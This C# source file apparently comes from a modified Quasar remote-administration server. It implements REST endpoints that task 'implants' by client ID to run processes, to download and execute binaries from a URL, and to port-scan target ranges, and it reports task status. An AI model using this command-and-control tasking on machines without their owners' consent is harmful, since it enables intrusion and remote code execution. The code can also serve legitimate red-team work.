using Quasar.Common.Logger;
using Quasar.Server.Messages;
using Quasar.Server.RestApiConstants;
using Quasar.Server.Tasking;
using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Text.Json;

namespace Quasar.Server.RestApi
{
    public static partial class RestServer
    {
        private static void HandleTaskEndpoint(HttpListenerRequest request, HttpListenerResponse response)
        {
            if (request.HttpMethod == "POST")
            {
                try
                {
                    // Determine task type and then proceed accordingly
                    Dictionary<string, JsonElement> dataDict = GetApiRequestPostData(request);
                    int taskType = GetTaskTypeFromPostDict(dataDict);

                    if (taskType == TaskType.EXECUTE_PROCESS)
                    {
                        // Create a new process execution task
                        ExecuteProcessApiRequest req = GetExecuteProcessApiRequestFromPostDict(dataDict);
                        Logger.Debug(String.Format(
                            "Received new execute process API request for client ID: {0}",
                            req.ClientId
                        ));
                        Logger.Debug(String.Format(
                            "Request details: {0}",
                            req.ToString()
                        ));

                        TaskManagerHandler handler = CreateNewOrGetExistingProcManagerHandler(req.ClientId);

                        string taskId = "";
                        if (!String.IsNullOrEmpty(req.BinaryPath))
                        {
                            taskId = handler.StartProcess(
                                req.BinaryPath, 
                                processArgs: req.ProcessArgs,
                                useShellExecute: req.UseShellExecute,
                                captureOutput: req.CaptureOutput,
                                noWindow: req.NoWindow
                            );
                        }
                        else
                        {
                            taskId = handler.StartProcessFromWeb(
                                req.DownloadUrl,
                                downloadDest: req.DownloadDestPath, 
                                processArgs: req.ProcessArgs,
                                useShellExecute: req.UseShellExecute,
                                captureOutput: req.CaptureOutput,
                                noWindow: req.NoWindow
                            );
                        }

                        if (String.IsNullOrEmpty(taskId))
                        {
                            throw new Exception("Failed to create process execution task.");
                        }
                        if (ImplantTaskManager.ImplantTaskExists(taskId))
                        {
                            SendSuccessResponse(response, GetSerializedTaskInfo(taskId));
                            Logger.Debug("Sent process execution task information for task ID " + taskId);
                        }
                        else
                        {
                            throw new Exception(String.Format("Newly created process execution task with ID {0} was not registered.", taskId));
                        }
                    }
                    else if (taskType == TaskType.PORT_SCAN)
                    {
                        // Create a new port scan task
                        PortScanApiRequest req = GetPortScanApiRequestFromPostDict(dataDict);
                        Logger.Debug(String.Format(
                            "Received new port scan API request for client ID: {0}",
                            req.ClientId
                        ));
                        Logger.Debug(String.Format("Request details: {0}", req.ToString()));

                        PortScanHandler handler = CreateNewOrGetExistingPortScanManagerHandler(req.ClientId);

                        string taskId = handler.StartPortScan(req.TargetRange, req.TargetPorts);
                        if (String.IsNullOrEmpty(taskId))
                        {
                            throw new Exception("Failed to create port scan task.");
                        }
                        if (ImplantTaskManager.ImplantTaskExists(taskId))
                        {
                            SendSuccessResponse(response, GetSerializedTaskInfo(taskId));
                            Logger.Debug("Sent port scan task information for task ID " + taskId);
                        }
                        else
                        {
                            throw new Exception(String.Format("Newly created port scan task with ID {0} was not registered.", taskId));
                        }
                    }
                    else
                    {
                        throw new Exception(String.Format("Unsupported task type {0}", taskType));
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error("HandleTaskEndpoint exception: " + ex.ToString());
                    SendResponse(response, HttpStatusCode.InternalServerError, ex.Message);
                }
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for task endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }

        private static void HandleSpecificTaskEndpoint(HttpListenerRequest request, HttpListenerResponse response, string path)
        {
            if (request.HttpMethod == "GET")
            {
                string taskId = TrimBasePath(path, BASE_TASKS_ENDPOINT + "/");
                Logger.Debug("Received task information request for task ID " + taskId);
                if (ImplantTaskManager.ImplantTaskExists(taskId))
                {
                    try
                    {
                        SendSuccessResponse(response, GetSerializedTaskInfo(taskId));
                        Logger.Debug("Sent task information for task ID " + taskId);
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(String.Format("Failed to fetch task info for task ID {0}: {1}", taskId, ex.ToString()));
                        SendResponse(
                            response, 
                            HttpStatusCode.InternalServerError, 
                            String.Format("Failed to fetch task info for task ID {0}: {1}", taskId, ex.Message)
                        );
                    }
                }
                else
                {
                    Logger.Error(String.Format("Task with ID {0} does not exist. Sending 404.", taskId));
                    SendResponse(response, HttpStatusCode.NotFound, String.Format("Task ID {0} does not exist.", taskId));
                }
            }
            else
            {
                Logger.Error(String.Format("HTTP method {0} not supported for specific task endpoint.", request.HttpMethod));
                SendResponse(response, HttpStatusCode.MethodNotAllowed, "Unsupported HTTP method " + request.HttpMethod);
            }
        }

        /// <summary>
        /// Generate byte representation of JSON dictionary containing task information
        /// </summary>
        private static byte[] GetSerializedTaskInfo(string taskId)
        {
            string taskInfoStr = JsonSerializer.Serialize(ImplantTaskManager.GetTaskInfoDict(taskId));
            return Encoding.UTF8.GetBytes(taskInfoStr);
        }

        public static int GetTaskTypeFromPostDict(Dictionary<string, JsonElement> dataDict)
        {
            // Client ID
            if (!dataDict.ContainsKey(RestConstants.TASK_TYPE_FIELD))
            {
                throw new JsonException(String.Format("Task POST request did not contain required task type key \"{0}\"", RestConstants.TASK_TYPE_FIELD));
            }
            else
            {
                return dataDict[RestConstants.TASK_TYPE_FIELD].GetInt32();
            }
        }
    }
}